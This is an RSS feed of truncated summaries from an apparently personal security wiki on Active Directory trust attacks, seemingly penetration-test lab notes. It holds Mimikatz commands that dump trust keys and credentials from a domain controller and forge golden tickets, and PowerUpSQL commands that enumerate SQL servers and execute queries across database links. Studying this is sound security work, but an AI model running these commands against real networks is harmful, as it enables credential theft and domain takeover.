<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Trust Attacks on</title><link>https://wiki.bufu-sec.com/active_directory/trust_attacks/</link><description>Recent content in Trust Attacks on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/trust_attacks/index.xml" rel="self" type="application/rss+xml"/><item><title>Cross-Domain Attacks</title><link>https://wiki.bufu-sec.com/active_directory/trust_attacks/cross_domain_attacks/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/trust_attacks/cross_domain_attacks/</guid><description>General # Domains in the same forest have an implicit two-way trust relationship There is a trust key between the parent and child domains There are two ways of escalating privileges between two domains of the same forest Krbtgt hash Trust tickets Authentication Process for Resource in Different Domain # Client requests TGT from DC in own domain DC sends back TGT Client shows TGT when requesting TGS for resource in another domain DC checks global catalog and finds resource in another domain DC sends back inter-realm TGT encrypted with Trust Key Client sends inter-realm TGT when requesting TGS for resource to DC of target domain DC checks if trust key is valid If yes, sends back TGS Client presents TGS when accessing target resource Target resource checks if client can access resource Exploitation # Child to Forest Root using Trust Key # Vulnerable step here is step 6, sending the TGT encrypted with trust key If we have the trust key, we can forge a ticket Escalate privileges from Domain Admin in current domain to Enterprise Admin or DA in forest root Arguments # Argument Description kerberos::golden Module name /domain:domain:dollarcorp.</description></item><item><title>Cross-Forest Attacks</title><link>https://wiki.bufu-sec.com/active_directory/trust_attacks/cross_forest_attacks/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/trust_attacks/cross_forest_attacks/</guid><description>General # Same attack flow as with cross-domain attacks But: trust between forest must be established manually No implicit trust Cannot abuse SID because of SID filtering We only get the privileges the user we are impersonating has in the target forest Exploitation # # Get trust key for the inter-forest trust Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::trust /patch&amp;#34;&amp;#39; -ComputerName dcorp-dc Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39; -ComputerName dcorp-dc Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::dcsync /user:dcorp\ecorp$&amp;#34;&amp;#39; # Forge inter-forest TGT Invoke-Mimikatz -Command &amp;#39;&amp;#34;kerberos::golden /domain:dollarcorp.</description></item><item><title>MS-SQL Servers</title><link>https://wiki.bufu-sec.com/active_directory/trust_attacks/mssql_servers/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/trust_attacks/mssql_servers/</guid><description>General # Generally deployed in a lot of Windows domains Good option for lateral movement as domain users can be mapped to database roles We can use PowerUpSQL for exploitation Cheatsheet Exploitation # Enumeration # # Discovery (SPN Scanning) Get-SQLInstanceDomain # Check accessibility Get-SQLConnectionTestThreaded Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose # Gather information Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Database Links # Database link allows a SQL Server to access exteranl data sources like other SQL server and OLE DB data sources For links between SQL servers, we can exectue stored procedures Links work across forest trusts Using PowerUpSQL # # Look for links to remote server Get-SQLServerLink -Instance dcorp-mssql -Verbose # Enumerate database links Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose # Execute commands Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query &amp;#34;exec master.</description></item></channel></rss>